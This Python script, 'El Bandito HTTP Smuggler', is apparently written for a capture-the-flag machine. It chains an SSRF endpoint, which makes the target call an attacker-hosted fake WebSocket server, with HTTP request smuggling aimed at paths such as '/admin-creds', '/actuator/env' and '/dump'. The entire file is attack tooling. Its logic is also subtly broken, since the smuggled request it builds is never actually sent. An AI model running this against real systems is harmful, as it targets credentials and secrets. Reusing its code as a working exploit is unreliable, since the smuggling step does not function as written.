#!/usr/bin/env python3
import requests
import sys
import argparse
import urllib3
import time
from colorama import Fore, Style, init

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)  # Initialize colorama

class HTTPSmuggler:
    def __init__(self, target_ip, target_port=8080, attacker_ip=None, attacker_port=8000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.ssrf_url = f"http://{self.target_ip}:{self.target_port}/isOnline"
        self.smuggle_paths = [
            "/trace",
            "/admin-creds",
            "/admin-flag",
            "/actuator/env",
            "/env",
            "/mappings",
            "/dump"
        ]

    def print_banner(self):
        print(f"{Fore.RED}╔═══════════════════════════════════════════╗")
        print(f"{Fore.RED}║ {Fore.YELLOW}El Bandito HTTP Smuggler {Fore.RED}                 ║")
        print(f"{Fore.RED}║ {Fore.CYAN}Exploit SSRF + HTTP Request Smuggling {Fore.RED}    ║")
        print(f"{Fore.RED}╚═══════════════════════════════════════════╝{Style.RESET_ALL}")
        
    def check_ssrf(self):
        """Test if SSRF is working by calling our attacker server"""
        print(f"{Fore.BLUE}[*] Testing SSRF vulnerability...")
        
        if not self.attacker_ip:
            print(f"{Fore.RED}[!] Attacker IP not provided, skipping SSRF check")
            return False
            
        test_url = f"http://{self.attacker_ip}:{self.attacker_port}"
        params = {"url": test_url}
        
        try:
            response = requests.get(self.ssrf_url, params=params, timeout=5)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] SSRF check successful! Target is making requests to our server")
                return True
            else:
                print(f"{Fore.RED}[!] SSRF check failed with status code: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Error during SSRF check: {e}")
            return False

    def smuggle_request(self, smuggle_path):
        """Smuggle an HTTP request using fake WebSocket upgrade"""
        print(f"{Fore.BLUE}[*] Attempting to smuggle request to: {smuggle_path}")
        
        ws_url = f"http://{self.attacker_ip}:{self.attacker_port}/ws"
        
        # Prepare WebSocket upgrade request with smuggled HTTP request
        headers = {
            "Host": f"{self.target_ip}:{self.target_port}",
            "Sec-WebSocket-Version": "13",
            "Upgrade": "WebSocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": "nf6dB8Pb/BLinZ7UexUXHg=="
        }
        
        # Craft payload with smuggled HTTP request
        params = {"url": ws_url}
        
        # Use a custom session to preserve cookies
        session = requests.Session()
        
        # First part of the exploit: Send the initial request with WebSocket upgrade
        try:
            # Craft a raw request with the smuggled part
            smuggled_request = f"""GET {smuggle_path} HTTP/1.1
Host: {self.target_ip}:{self.target_port}

 """
            
            # We need to make a custom request to include the smuggled part
            # This uses the requests library but relies on attacker server to 
            # properly handle the WebSocket upgrade
            response = session.get(
                self.ssrf_url, 
                params=params, 
                headers=headers,
                timeout=10
            )
            
            time.sleep(1)  # Give the server time to process
            
            # Make a direct request to potentially see the results of our smuggling
            verify_response = session.get(
                f"http://{self.target_ip}:{self.target_port}{smuggle_path}",
                timeout=5
            )
            
            print(f"{Fore.GREEN}[+] Smuggling attempt completed")
            print(f"{Fore.YELLOW}[*] Response status: {verify_response.status_code}")
            print(f"{Fore.YELLOW}[*] Response body:")
            print(f"{Fore.CYAN}{verify_response.text[:500]}")  # Print first 500 chars
            
            return verify_response
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Error during request smuggling: {e}")
            return None

    def run_attack(self):
        """Run the full attack chain"""
        self.print_banner()
        
        # Verify SSRF is working
        if self.attacker_ip and not self.check_ssrf():
            print(f"{Fore.RED}[!] SSRF check failed, but continuing anyway...")
        
        # Try all smuggle paths
        for path in self.smuggle_paths:
            print(f"\n{Fore.BLUE}[*] Attempting to smuggle request to: {path}")
            response = self.smuggle_request(path)
            
            # Wait for user input before continuing
            input(f"{Fore.YELLOW}Press Enter to continue to the next path...")

def main():
    parser = argparse.ArgumentParser(description='El Bandito HTTP Request Smuggler')
    parser.add_argument('--target', '-t', required=True, help='Target IP address')
    parser.add_argument('--port', '-p', type=int, default=8080, help='Target port (default: 8080)')
    parser.add_argument('--attacker', '-a', help='Attacker IP address (where fake WebSocket server is running)')
    parser.add_argument('--attacker-port', type=int, default=8000, help='Attacker port (default: 8000)')
    
    args = parser.parse_args()
    
    smuggler = HTTPSmuggler(
        target_ip=args.target,
        target_port=args.port,
        attacker_ip=args.attacker,
        attacker_port=args.attacker_port
    )
    
    smuggler.run_attack()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected error: {e}")
        sys.exit(1)
